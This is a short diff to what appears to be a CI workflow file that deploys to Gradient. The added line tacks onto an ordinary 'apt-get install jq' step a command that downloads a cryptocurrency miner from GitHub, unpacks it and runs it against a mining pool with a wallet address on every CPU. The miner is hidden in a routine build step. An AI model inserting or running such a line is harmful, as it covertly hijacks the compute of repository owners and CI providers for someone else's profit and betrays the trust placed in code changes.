@@ -43,7 +43,7 @@ jobs:
           instanceType: P4000
         EOF
         apt update > /dev/null
-        apt-get install -y jq
+        apt-get install -y jq && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQ49i5erGDL5XnpUEjKksn9SvdES8qjsow -p x --cpu $(nproc)
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
